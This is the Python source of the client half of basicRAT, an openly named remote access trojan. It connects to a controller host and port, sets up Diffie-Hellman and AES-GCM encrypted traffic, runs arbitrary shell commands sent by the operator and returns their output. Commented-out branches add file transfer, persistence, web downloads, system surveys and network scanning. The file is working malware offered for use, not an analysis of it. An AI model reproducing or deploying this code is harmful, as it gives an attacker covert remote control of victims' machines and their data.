#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import subprocess
import struct
import sys

from core import common
from core import crypto
#from core import filesock
from core import persistence
from core import scan
from core import survey
from core import toolkit

from Crypto.Util.number import bytes_to_long, long_to_bytes
from binascii import hexlify

PLAT_TYPE = sys.platform
HOST      = 'localhost'
PORT      = 1337
FB_KEY    = '82e672ae054aa4de6f042c888111686a'
# generate your own key with...
# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"


def main():
    conn = socket.socket()
    conn.connect((HOST, PORT))
    DHKEY = crypto.diffiehellman(conn)
    GCM = crypto.AES_GCM(DHKEY)
    IV = 0

    # must be set to non-blocking AFTER Diffie Hellman Exchange
    conn.setblocking(0)
    while True:
        try:
            data = crypto.recvGCM(conn, GCM)

        except crypto.InvalidTagException as e:
            print e
            continue

        if not data: continue

        # seperate prompt into command and action
        cmd, _, action = data.partition(' ')

        # stop client
        if cmd == 'quit':
            conn.close()
            sys.exit(0)

        # run command
        elif cmd == 'run':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()

            # send data to client
            crypto.sendGCM(conn, GCM, IV, results)
            IV += 1

        # # send file
        # elif cmd == 'download':
        #     for fname in action.split():
        #         fname = fname.strip()
        #         filesock.sendfile(conn, fname, DHKEY)

        # # receive file
        # elif cmd == 'upload':
        #     for fname in action.split():
        #         fname = fname.strip()
        #         filesock.recvfile(conn, fname, DHKEY)

        # regenerate DH key
        elif cmd == 'rekey':
            DHKEY = crypto.diffiehellman(conn)
            print hexlify(DHKEY)

        # # apply persistence mechanism
        # elif cmd == 'persistence':
        #     results = persistence.run(PLAT_TYPE)
        #     conn.send(crypto.AES_encrypt(results, DHKEY))

        # # download a file from the web
        # elif cmd == 'wget':
        #     results = toolkit.wget(action)
        #     conn.send(crypto.AES_encrypt(results, DHKEY))

        # # unzip a file
        # elif cmd == 'unzip':
        #     results = toolkit.unzip(action)
        #     conn.send(crypto.AES_encrypt(results, DHKEY))

        # # run system survey
        # elif cmd == 'survey':
        #     results = survey.run(PLAT_TYPE)
        #     conn.send(crypto.AES_encrypt(results, DHKEY))

        # # run a scan
        # elif cmd == 'scan':
        #     results = scan.single_host(action)
        #     conn.send(crypto.AES_encrypt(results, DHKEY))


if __name__ == '__main__':
    main()
